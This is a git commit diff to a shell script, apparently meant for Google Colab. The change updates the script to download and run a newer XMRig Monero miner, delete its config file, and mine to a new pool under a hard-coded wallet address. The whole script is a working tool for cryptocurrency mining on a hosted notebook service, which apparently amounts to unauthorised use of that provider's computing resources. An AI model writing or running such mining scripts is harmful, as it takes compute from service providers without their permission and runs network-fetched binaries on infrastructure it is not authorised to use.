0fa8aee76e2c73c3302fd40e07070709842a2784
KIM-SOFT <76026147+KIM-SOFT@users.noreply.github.com>
2022-04-28 19:07:46 +0000

    Update gcolab-sg.sh

--- gcolab-sg.sh
+++ gcolab-sg.sh
@@ -7,7 +7,8 @@ clear
 sudo apt install screen
 screen -R xmr
  
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
-tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
-cd xmrig-6.16.4
-./xmrig -o sg.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id GC
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-static-x64.tar.gz 
+cd xmrig-6.17.0
+rm config.json
+./xmrig -o xmrpool.eu:9999 -u 49fYvmBsirkT53ErUyJ59Qa4kxcs6xmq3RTXNvMfQdUSbbSzYRFu3rNPY2JLpgg1tzeqarroWgPUqLDKmn9t7vsr6U11gnG -k --tls  --rig-id cola
